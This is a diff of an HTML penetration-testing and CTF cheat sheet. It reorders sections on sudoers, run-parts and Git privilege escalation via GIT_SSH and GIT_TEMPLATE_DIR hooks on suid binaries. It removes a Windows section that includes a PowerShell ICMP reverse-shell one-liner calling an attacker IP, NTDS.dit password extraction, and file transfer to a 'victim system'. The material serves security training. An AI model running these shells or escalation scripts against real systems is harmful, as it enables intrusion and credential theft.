 <h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
 <p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information store.d</p>
 </div>
-<div class="section" id="id17">
-<h4>PHP<a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id20">
+<h4>PHP<a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
 <li>PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a></li>
 </ul>
-</div>
-</div>
-<div class="section" id="run-parts">
-<h3>run-parts<a class="headerlink" href="#run-parts" title="Permalink to this headline">¶</a></h3>
-<p>run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>run-parts /etc/cron.daily
-</pre></div>
-</div>
-</div>
-<div class="section" id="sudoers-file">
-<h3>Sudoers file<a class="headerlink" href="#sudoers-file" title="Permalink to this headline">¶</a></h3>
-<p>If the sudoers file contains:</p>
-<div class="section" id="secure-path">
-<h4>secure_path<a class="headerlink" href="#secure-path" title="Permalink to this headline">¶</a></h4>
-<p>Path used for every command run from sudo. If you don’t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.</p>
-</div>
-<div class="section" id="env-reset">
-<h4>env_reset<a class="headerlink" href="#env-reset" title="Permalink to this headline">¶</a></h4>
-<p>If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller’s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.</p>
-</div>
-<div class="section" id="mail-badpass">
-<h4>mail_badpass<a class="headerlink" href="#mail-badpass" title="Permalink to this headline">¶</a></h4>
-<p>Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.</p>
 </div>
 </div>
 <div class="section" id="docker-security">
@@ -2459,92 +2802,6 @@ root-shell-ftw-4.3#
 </pre></div>
 </div>
 </div></blockquote>
-</div>
-</div>
-<div class="section" id="java-keystore-file">
-<h3>Java keystore file<a class="headerlink" href="#java-keystore-file" title="Permalink to this headline">¶</a></h3>
-<p>Refer <a class="reference external" href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">Java Keytool essentials working with java keystores</a> and <a class="reference external" href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">openssl essentials working with ssl certificates private keys and csrs</a></p>
-</div>
-<div class="section" id="cracking-md5-hashes">
-<h3>Cracking MD5 Hashes<a class="headerlink" href="#cracking-md5-hashes" title="Permalink to this headline">¶</a></h3>
-<p>Try <a class="reference external" href="https://crackstation.net/">Crackstation</a> or <a class="reference external" href="https://isc.sans.edu/tools/reversehash.html">ISC Reverse hash</a></p>
-</div>
-<div class="section" id="steghide">
-<h3>Steghide<a class="headerlink" href="#steghide" title="Permalink to this headline">¶</a></h3>
-<p>Looking for hidden text in the images? Utilize steghide</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>steghide version 0.5.1
-
-the first argument must be one of the following:
-embed, --embed          embed data
-extract, --extract      extract data
-info, --info            display information about a cover- or stego-file
-info &lt;filename&gt;       display information about &lt;filename&gt;
-encinfo, --encinfo      display a list of supported encryption algorithms
-version, --version      display version information
-license, --license      display steghide&#39;s license
-help, --help            display this usage information
-</pre></div>
-</div>
-<div class="admonition tip">
-<p class="first admonition-title">Tip</p>
-<p class="last">Sometimes, there is no password, so just press enter.</p>
-</div>
-</div>
-<div class="section" id="git-client-privilege-escalation">
-<h3>Git client Privilege Escalation<a class="headerlink" href="#git-client-privilege-escalation" title="Permalink to this headline">¶</a></h3>
-<p>Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial">12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial</a></p>
-<p>In one of write-up, <a class="reference external" href="http://devloop.users.sourceforge.net/">Nicolas Surribas</a> has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.</p>
-<div class="section" id="git-ssh">
-<h4>GIT_SSH<a class="headerlink" href="#git-ssh" title="Permalink to this headline">¶</a></h4>
-<p>If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the <a class="reference external" href="mailto:username&#37;&#52;&#48;host">username<span>&#64;</span>host</a> (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>echo &#39;#!/bin/bash&#39; &gt; cmd
-echo &#39;cp /root/flag.txt /tmp&#39; &gt;&gt; cmd
-echo &#39;chmod 777 /tmp/flag.txt&#39; &gt;&gt; cmd
-GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)
-
-or
-
-echo &#39;chown root:root /home/username/priv ; chmod 4755 /home/username/priv&#39; &gt; ssh
-
-where priv is binary compiled from suid.c
-</pre></div>
-</div>
-<p>This basically changes the command from</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>trace: built-in: git &#39;clone&#39; &#39;ssh://root@machine-dev:/root/secret-project&#39; &#39;/mnt/secret-project/&#39;
-</pre></div>
-</div>
-<p>to</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>trace: run_command: &#39;/home/user/ssh&#39; &#39;root@machine-dev&#39; &#39;git-upload-pack &#39;\&#39;&#39;/root/secret-project&#39;\&#39;&#39;&#39;
-</pre></div>
-</div>
-</div>
-<div class="section" id="git-template-dir">
-<h4>GIT_TEMPLATE_DIR<a class="headerlink" href="#git-template-dir" title="Permalink to this headline">¶</a></h4>
-<p>Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer <a class="reference external" href="https://git-scm.com/docs/git-init">Git-init</a></p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>cp -r /usr/share/git-core/templates/ mytemplates
-cd mytemplates/hooks
-echo &#39;#!/bin/bash&#39; &gt; post-checkout
-echo &#39;cp /root/flag /tmp/flag2&#39; &gt;&gt; post-checkout
-echo &#39;chown username.username /tmp/flag2&#39; &gt;&gt; post-checkout
-chmod +x post-checkout
-cd ../..
-GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)
-</pre></div>
-</div>
-</div>
-</div>
-<div class="section" id="metasploit-shell-upgrade">
-<h3>Metasploit shell upgrade<a class="headerlink" href="#metasploit-shell-upgrade" title="Permalink to this headline">¶</a></h3>
-<p>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>sessions -h
-Usage: sessions [options]
-
-Active session manipulation and interaction.
-
-OPTIONS:
-
--u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
-</pre></div>
 </div>
 </div>
 <div class="section" id="password-protected-file">
@@ -2684,6 +2941,159 @@ if __name__ == &quot;__main__&quot;:
 <p>it’s probably <a class="reference external" href="http://point-at-infinity.org/seccure/">SECCURE Elliptic Curve Crypto Utility for Reliable Encryption</a> Utilize python module <a class="reference external" href="https://pypi.python.org/pypi/seccure">seccure</a> to get the plaintext.</p>
 </div>
 </div>
+<div class="section" id="network-information">
+<h3>Network Information<a class="headerlink" href="#network-information" title="Permalink to this headline">¶</a></h3>
+<p>Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?</p>
+<div class="section" id="ip">
+<h4>ip<a class="headerlink" href="#ip" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ip addr
+
+ 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+  inet 127.0.0.1/8 scope host lo
+     valid_lft forever preferred_lft forever
+ 17: wwan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+    link/ether b2:06:fe:2b:73:c6 brd ff:ff:ff:ff:ff:ff
+   inet 14.97.194.148/30 brd 14.97.194.151 scope global dynamic noprefixroute wwan0
+     valid_lft 5222sec preferred_lft 5222sec
+</pre></div>
+</div>
+</div>
+<div class="section" id="hostname">
+<h4>hostname<a class="headerlink" href="#hostname" title="Permalink to this headline">¶</a></h4>
+<p>We can also check the ipaddress of the host using hostname command</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>hostname -I
+172.17.0.1 14.97.194.148
+</pre></div>
+</div>
+</div>
+<div class="section" id="ss">
+<h4>ss<a class="headerlink" href="#ss" title="Permalink to this headline">¶</a></h4>
+<p>ss - another utility to investigate sockets</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ss
+
+      -n, --numeric
+             Do not try to resolve service names.
+    -l, --listening
+             Display only listening sockets (these are omitted by default).
+      -t, --tcp
+             Display TCP sockets.
+
+      -u, --udp
+             Display UDP sockets.
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="sudoers-file">
+<h3>Sudoers file<a class="headerlink" href="#sudoers-file" title="Permalink to this headline">¶</a></h3>
+<p>If the sudoers file contains:</p>
+<div class="section" id="secure-path">
+<h4>secure_path<a class="headerlink" href="#secure-path" title="Permalink to this headline">¶</a></h4>
+<p>Path used for every command run from sudo. If you don’t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.</p>
+</div>
+<div class="section" id="env-reset">
+<h4>env_reset<a class="headerlink" href="#env-reset" title="Permalink to this headline">¶</a></h4>
+<p>If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller’s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.</p>
+</div>
+<div class="section" id="mail-badpass">
+<h4>mail_badpass<a class="headerlink" href="#mail-badpass" title="Permalink to this headline">¶</a></h4>
+<p>Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.</p>
+</div>
+</div>
+<div class="section" id="run-parts">
+<h3>run-parts<a class="headerlink" href="#run-parts" title="Permalink to this headline">¶</a></h3>
+<p>run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>run-parts /etc/cron.daily
+</pre></div>
+</div>
+</div>
+<div class="section" id="java-keystore-file">
+<h3>Java keystore file<a class="headerlink" href="#java-keystore-file" title="Permalink to this headline">¶</a></h3>
+<p>Refer <a class="reference external" href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">Java Keytool essentials working with java keystores</a> and <a class="reference external" href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">openssl essentials working with ssl certificates private keys and csrs</a></p>
+</div>
+<div class="section" id="cracking-md5-hashes">
+<h3>Cracking MD5 Hashes<a class="headerlink" href="#cracking-md5-hashes" title="Permalink to this headline">¶</a></h3>
+<p>Try <a class="reference external" href="https://crackstation.net/">Crackstation</a> or <a class="reference external" href="https://isc.sans.edu/tools/reversehash.html">ISC Reverse hash</a></p>
+</div>
+<div class="section" id="steghide">
+<h3>Steghide<a class="headerlink" href="#steghide" title="Permalink to this headline">¶</a></h3>
+<p>Looking for hidden text in the images? Utilize steghide</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>steghide version 0.5.1
+
+the first argument must be one of the following:
+embed, --embed          embed data
+extract, --extract      extract data
+info, --info            display information about a cover- or stego-file
+info &lt;filename&gt;       display information about &lt;filename&gt;
+encinfo, --encinfo      display a list of supported encryption algorithms
+version, --version      display version information
+license, --license      display steghide&#39;s license
+help, --help            display this usage information
+</pre></div>
+</div>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">Sometimes, there is no password, so just press enter.</p>
+</div>
+</div>
+<div class="section" id="git-client-privilege-escalation">
+<h3>Git client Privilege Escalation<a class="headerlink" href="#git-client-privilege-escalation" title="Permalink to this headline">¶</a></h3>
+<p>Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial">12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial</a></p>
+<p>In one of write-up, <a class="reference external" href="http://devloop.users.sourceforge.net/">Nicolas Surribas</a> has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.</p>
+<div class="section" id="git-ssh">
+<h4>GIT_SSH<a class="headerlink" href="#git-ssh" title="Permalink to this headline">¶</a></h4>
+<p>If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the <a class="reference external" href="mailto:username&#37;&#52;&#48;host">username<span>&#64;</span>host</a> (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>echo &#39;#!/bin/bash&#39; &gt; cmd
+echo &#39;cp /root/flag.txt /tmp&#39; &gt;&gt; cmd
+echo &#39;chmod 777 /tmp/flag.txt&#39; &gt;&gt; cmd
+GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)
+
+or
+
+echo &#39;chown root:root /home/username/priv ; chmod 4755 /home/username/priv&#39; &gt; ssh
+
+where priv is binary compiled from suid.c
+</pre></div>
+</div>
+<p>This basically changes the command from</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>trace: built-in: git &#39;clone&#39; &#39;ssh://root@machine-dev:/root/secret-project&#39; &#39;/mnt/secret-project/&#39;
+</pre></div>
+</div>
+<p>to</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>trace: run_command: &#39;/home/user/ssh&#39; &#39;root@machine-dev&#39; &#39;git-upload-pack &#39;\&#39;&#39;/root/secret-project&#39;\&#39;&#39;&#39;
+</pre></div>
+</div>
+</div>
+<div class="section" id="git-template-dir">
+<h4>GIT_TEMPLATE_DIR<a class="headerlink" href="#git-template-dir" title="Permalink to this headline">¶</a></h4>
+<p>Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer <a class="reference external" href="https://git-scm.com/docs/git-init">Git-init</a></p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cp -r /usr/share/git-core/templates/ mytemplates
+cd mytemplates/hooks
+echo &#39;#!/bin/bash&#39; &gt; post-checkout
+echo &#39;cp /root/flag /tmp/flag2&#39; &gt;&gt; post-checkout
+echo &#39;chown username.username /tmp/flag2&#39; &gt;&gt; post-checkout
+chmod +x post-checkout
+cd ../..
+GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="metasploit-shell-upgrade">
+<h3>Metasploit shell upgrade<a class="headerlink" href="#metasploit-shell-upgrade" title="Permalink to this headline">¶</a></h3>
+<p>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>sessions -h
+Usage: sessions [options]
+
+Active session manipulation and interaction.
+
+OPTIONS:
+
+-u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
+</pre></div>
+</div>
+</div>
 <div class="section" id="truecrypt-files">
 <h3>Truecrypt Files<a class="headerlink" href="#truecrypt-files" title="Permalink to this headline">¶</a></h3>
 <p>If you have a truecrypt volume to open and crack it’s password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.</p>
@@ -2693,163 +3103,6 @@ if __name__ == &quot;__main__&quot;:
 <p>and Veracrypt or cryptsetup to open the file.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>cryptsetup open --type tcrypt &lt;Truecrypt&gt; &lt;MountName&gt;
 </pre></div>
-</div>
-</div>
-<div class="section" id="windows">
-<h3>Windows<a class="headerlink" href="#windows" title="Permalink to this headline">¶</a></h3>
-<div class="section" id="get-childitem-mode-values">
-<h4>Get-ChildItem Mode Values<a class="headerlink" href="#get-childitem-mode-values" title="Permalink to this headline">¶</a></h4>
-<p>‘Mode’ values returned by PowerShell’s Get-ChildItem cmdlet?</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>PS&gt; gci|select mode,attributes -u
-
-Mode                Attributes
-----                ----------
-d-----               Directory
-d-r---     ReadOnly, Directory
-d----l Directory, ReparsePoint
--a----                 Archive
-</pre></div>
-</div>
-<p>In any case, the full list is:</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>d - Directory
-a - Archive
-r - Read-only
-h - Hidden
-s - System
-l - Reparse point, symlink, etc.
-</pre></div>
-</div>
-</div>
-<div class="section" id="zip-or-unzip-using-only-windows-built-in-capabilities">
-<h4>Zip or unzip using ONLY Windows’ built-in capabilities?<a class="headerlink" href="#zip-or-unzip-using-only-windows-built-in-capabilities" title="Permalink to this headline">¶</a></h4>
-<p>Powershell way</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>Add-Type -A System.IO.Compression.FileSystem
-[IO.Compression.ZipFile]::CreateFromDirectory(&#39;foo&#39;, &#39;foo.zip&#39;)
-[IO.Compression.ZipFile]::ExtractToDirectory(&#39;foo.zip&#39;, &#39;bar&#39;)
-</pre></div>
-</div>
-</div>
-<div class="section" id="alternate-data-stream">
-<h4>Alternate Data Stream<a class="headerlink" href="#alternate-data-stream" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, <a class="reference external" href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">Alternate Data Stream</a> can be used to hide data in streams.</p>
-<p>The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).</p>
-<p>Powershell-Way</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; Get-Item -Path C:\Users\Administrator\example.zip -stream *
-
-Filename: C:\Users\Administrator\example.zip
-
-Stream             Length
-------             -------
-:$DATA             8
-pass.txt           4
-</pre></div>
-</div>
-<p>Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
-The password is Passw0rd!
-</pre></div>
-</div>
-<p>Check a directory for ADS?</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>gci -recurse | % { gi $_.FullName -stream * } | where stream -ne &#39;:$Data&#39;
-</pre></div>
-</div>
-<p>DIR Way</p>
-<p>Current directory ADS Streams</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>dir /r | find &quot;:$DATA&quot;
-</pre></div>
-</div>
-<p>Sub-directories too</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>dir   /s /r | find &quot;:$DATA&quot;
-</pre></div>
-</div>
-<p>Reading the hidden stream</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>more &lt; testfile.txt:hidden_stream::$DATA
-</pre></div>
-</div>
-</div>
-<div class="section" id="redirecting-standard-out-and-standard-error-from-powershell-start-process">
-<h4>Redirecting Standard Out and Standard Error from PowerShell Start-Process<a class="headerlink" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process" title="Permalink to this headline">¶</a></h4>
-<p>Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt
-</pre></div>
-</div>
-<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process">Powershell Start-Process Module Documentation</a>.</p>
-</div>
-<div class="section" id="ntds-dit-and-system-hive">
-<h4>NTDS.dit and SYSTEM hive<a class="headerlink" href="#ntds-dit-and-system-hive" title="Permalink to this headline">¶</a></h4>
-<p>If you have found files such as</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>192.168.110.133_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
-192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
-</pre></div>
-</div>
-<p>Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
-</pre></div>
-</div>
-</div>
-<div class="section" id="icmp-shell">
-<h4>ICMP Shell<a class="headerlink" href="#icmp-shell" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use <a class="reference external" href="https://github.com/inquisb/icmpsh">Simple reverse ICMP Shell</a> However, this requires the executable to be present on the system. There’s a powershell version of <a class="reference external" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">ICMP Reverse Shell</a> Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>powershell -nop -c &quot;$ip=&#39;your_ip&#39;; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;OK&#39;), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;&#39;), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }&quot;
-</pre></div>
-</div>
-<p>The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won’t be displayed!). Now, there’s a painful way of transferring files to the victim system which is</p>
-<ul class="simple">
-<li>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the uncessesary code/ comments, this would help us to reduce the length of the base64)</li>
-<li>Utilize the <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1">Add-Content cmdlet</a> to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>Add-Content &lt;filename&gt; &quot;Base64 encoded content&quot;
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Once the base64-encoded data is transferred, we can utilize <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx">certutil</a> from Microsoft to decode the base64-encoded to normal file.</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>certutil &lt;-decode/ -encode&gt; &lt;input file&gt; &lt;output file&gt;
--decode Decode a Base64-encoded file
--encode Encode a file to Base64
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer managment so, we would be able to get full output of the commands.</li>
-<li>Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let’s say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>$username = &#39;UsernameHere&#39;;
-$password = &#39;PasswordHere&#39;;
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-</pre></div>
-</div>
-</div></blockquote>
-<ul>
-<li><p class="first">Once, we have created a PSCredential, we can use <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command">Invoke-Command</a>  to execute command as that user.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
--ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn&#39;t work.
-</pre></div>
-</div>
-</li>
-<li><p class="first">Possibly, we can execute the ICMP Shell code to get the shell as the new user.</p>
-</li>
-<li><p class="first">One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user.</p>
-<ul class="simple">
-<li>Check powershell processes with Show-Process</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>Show-Process -Name *power* &quot;
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Note down  the PID</li>
-<li>Execute shell as the different user</li>
-<li>Stop-Process the previous PID</li>
-</ul>
-</li>
-</ul>
 </div>
 </div>
 <div class="section" id="grep-in-input-box">
@@ -2877,8 +3130,8 @@ Remember grep works in a way &quot;grep bitvijays /etc/passwd&quot; is find bitv
 <blockquote>
 <div>This command searches for any character in the file and comments out the reference to dictionary.txt</div></blockquote>
 </div>
-<div class="section" id="others">
-<h3>Others<a class="headerlink" href="#others" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id23">
+<h3>Others<a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h3>
 <ul class="simple">
 <li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.</li>
 <li>If there’s a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.</li>
@@ -3088,7 +3341,7 @@ Drupal settings file location: /var/www/html/sites/default/settings.php</p>
 </ul>
 </div></blockquote>
 <ul>
-<li><p class="first">Running Asterisk/ Elastix/ FreePBX or any PBX, probably try <a class="reference external" href="https://github.com/EnableSecurity/sipvicious">SIPVicious</a>  suite is a set of tools that can be used to audit SIP based VoIP systems. Running http:\IPpanel should provide us valid extensions.</p>
+<li><p class="first">Running Asterisk/ Elastix/ FreePBX or any PBX, probably try <a class="reference external" href="https://github.com/EnableSecurity/sipvicious">SIPVicious</a>  suite is a set of tools that can be used to audit SIP based VoIP systems. Running “http:\IPpanel” should provide us valid extensions.</p>
 </li>
 <li><p class="first">Sharepoint running? Probably, check <a class="reference external" href="https://github.com/sensepost/SPartan">SPartan</a> Frontpage and Sharepoint fingerprinting and attack tool and <a class="reference external" href="https://github.com/0rigen/SharePwn">SharePwn</a> SharePoint Security Auditor.</p>
 </li>
@@ -3096,7 +3349,7 @@ Drupal settings file location: /var/www/html/sites/default/settings.php</p>
 </li>
 <li><p class="first">Mostly, if there’s only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?</p>
 </li>
-<li><p class="first">If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work:)</p>
